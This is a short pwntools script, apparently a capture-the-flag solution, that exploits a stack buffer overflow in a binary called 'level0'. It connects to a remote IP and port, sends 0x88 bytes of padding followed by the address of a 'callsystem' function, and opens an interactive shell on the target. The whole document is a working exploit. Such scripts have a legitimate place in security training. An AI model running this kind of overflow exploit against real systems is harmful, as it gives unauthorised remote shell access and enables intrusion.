from pwn import *

#io = process("./level0")
io = remote("111.200.241.244", 56250)

pad = 0x80

elf = ELF("level0")

sys_addr = elf.sym["callsystem"]

print(hex(sys_addr))
sys_addr = 0x400597

io.recvline()

payload = pad*b'a' + 8*b'a' + p64(sys_addr)

io.send(payload)

io.interactive()
